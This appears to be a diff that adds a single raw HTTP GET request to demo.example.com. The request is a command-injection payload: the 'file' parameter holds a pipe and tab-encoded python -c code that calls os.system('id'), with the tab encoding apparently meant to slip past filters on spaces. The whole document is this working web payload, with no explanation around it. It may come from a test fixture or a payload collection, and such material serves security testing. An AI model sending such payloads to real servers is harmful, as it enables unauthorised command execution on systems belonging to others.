@@ -1,0 +1,4 @@
+GET /a?file=|%09python%09-c%09"import%09os;%09os.system('id')" HTTP/1.1
+Host: demo.example.com
+Connection: close
+
